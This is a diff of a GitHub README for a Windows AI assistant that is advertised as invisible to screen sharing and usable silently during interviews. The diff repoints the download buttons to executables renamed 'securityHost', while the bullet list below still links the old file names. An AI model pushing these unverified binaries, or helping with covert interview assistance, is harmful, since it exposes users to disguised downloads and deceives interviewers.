@@ -5,13 +5,29 @@
 
 ---
 
-[![Release](https://img.shields.io/badge/Release-Latest-00f2fe?style=for-the-badge&logo=github)](https://github.com/ravanERROR/pavans_Ai/releases)
-[![Platform](https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011%20(64--bit)-7000ff?style=for-the-badge&logo=windows)](https://github.com/ravanERROR/pavans_Ai)
-[![Privacy Status](https://img.shields.io/badge/Privacy-100%25%20Screen%20Share%20Invisible-00f5a0?style=for-the-badge&logo=shield)](https://github.com/ravanERROR/pavans_Ai)
+<div align="center">
 
-<br>
+  <!-- Status Badges -->
+  <p align="center">
+    <a href="https://github.com/ravanERROR/pavans_Ai/releases"><img src="https://img.shields.io/badge/Release-Latest-00f2fe?style=for-the-badge&labelColor=0d1117&logo=github&logoColor=00f2fe" alt="Release"></a>
+    <a href="https://github.com/ravanERROR/pavans_Ai"><img src="https://img.shields.io/badge/Platform-Windows%2010%20%2F%2011-7000ff?style=for-the-badge&labelColor=0d1117&logo=windows&logoColor=7000ff" alt="Platform"></a>
+    <a href="https://github.com/ravanERROR/pavans_Ai"><img src="https://img.shields.io/badge/Privacy-100%25%20Screen%20Share%20Invisible-00f5a0?style=for-the-badge&labelColor=0d1117&logo=shield&logoColor=00f5a0" alt="Privacy"></a>
+  </p>
 
-[<img src="https://img.shields.io/badge/⚡_DIRECT_DOWNLOAD-pavans__w.zip_(Latest_Release)-00f5a0?style=for-the-badge&logo=windows&logoColor=black" height="46">](https://github.com/ravanERROR/pavans_Ai/releases/latest/download/pavans_w.zip) &nbsp; [<img src="https://img.shields.io/badge/📦_DOWNLOAD_EXE-pavans__w.exe-00f2fe?style=for-the-badge&logo=windows&logoColor=black" height="46">](https://github.com/ravanERROR/pavans_Ai/raw/main/pavans_w.exe)
+  <br>
+
+  <!-- Animated High-Visibility Download Buttons -->
+  <p align="center">
+    <a href="https://github.com/ravanERROR/pavans_Ai/releases/latest/download/securityHost.zip">
+      <img src="https://readme-typing-svg.demolab.com?font=Outfit&weight=800&size=20&duration=2000&pause=500&color=00F5A0&background=0F172A&center=true&vCenter=true&width=380&height=60&lines=⚡+DIRECT+DOWNLOAD+ZIP;📦+securityHost.zip+(Latest);🚀+CLICK+TO+DOWNLOAD+NOW" alt="Animated Download ZIP Button" />
+    </a>
+    &nbsp;&nbsp;&nbsp;&nbsp;
+    <a href="https://github.com/ravanERROR/pavans_Ai/raw/main/securityHost.exe">
+      <img src="https://readme-typing-svg.demolab.com?font=Outfit&weight=800&size=20&duration=2000&pause=500&color=00F2FE&background=0F172A&center=true&vCenter=true&width=380&height=60&lines=📦+DOWNLOAD+STANDALONE+EXE;⚡+securityHost.exe+(Direct);🔥+INSTANT+WINDOWS+EXE" alt="Animated Download EXE Button" />
+    </a>
+  </p>
+
+</div>
 
 ---
 
@@ -61,7 +77,15 @@ Control your AI assistant silently without taking your hands off the keyboard du
 
 Click a direct download button below to get the latest release:
 
-[<img src="https://img.shields.io/badge/⬇️_DIRECT_DOWNLOAD-pavans__w.zip-00f5a0?style=for-the-badge&logo=windows&logoColor=black" height="42">](https://github.com/ravanERROR/pavans_Ai/releases/latest/download/pavans_w.zip) &nbsp; [<img src="https://img.shields.io/badge/⬇️_DOWNLOAD_EXE-pavans__w.exe-00f2fe?style=for-the-badge&logo=windows&logoColor=black" height="42">](https://github.com/ravanERROR/pavans_Ai/raw/main/pavans_w.exe)
+<p align="center">
+  <a href="https://github.com/ravanERROR/pavans_Ai/releases/latest/download/securityHost.zip">
+    <img src="https://readme-typing-svg.demolab.com?font=Outfit&weight=800&size=18&duration=2000&pause=500&color=00F5A0&background=0F172A&center=true&vCenter=true&width=340&height=52&lines=⬇️+DIRECT+DOWNLOAD+ZIP;📦+securityHost.zip" alt="Download ZIP" />
+  </a>
+  &nbsp;&nbsp;&nbsp;&nbsp;
+  <a href="https://github.com/ravanERROR/pavans_Ai/raw/main/securityHost.exe">
+    <img src="https://readme-typing-svg.demolab.com?font=Outfit&weight=800&size=18&duration=2000&pause=500&color=00F2FE&background=0F172A&center=true&vCenter=true&width=340&height=52&lines=📦+DOWNLOAD+EXE;⚡+securityHost.exe" alt="Download EXE" />
+  </a>
+</p>
 
 - **ZIP Archive (Recommended)**: Download [`pavans_w.zip`](https://github.com/ravanERROR/pavans_Ai/releases/latest/download/pavans_w.zip) and extract it to any folder.
 - **Standalone Executable**: Download [`pavans_w.exe`](https://github.com/ravanERROR/pavans_Ai/raw/main/pavans_w.exe).
@@ -135,3 +159,4 @@ Simply press <kbd>Ctrl</kbd> + <kbd>R</kbd> to reset your session and clear the 
 ## 📄 License & Privacy
 
 This software is provided for educational and interview preparation purposes. 100% private & zero data logging.
+
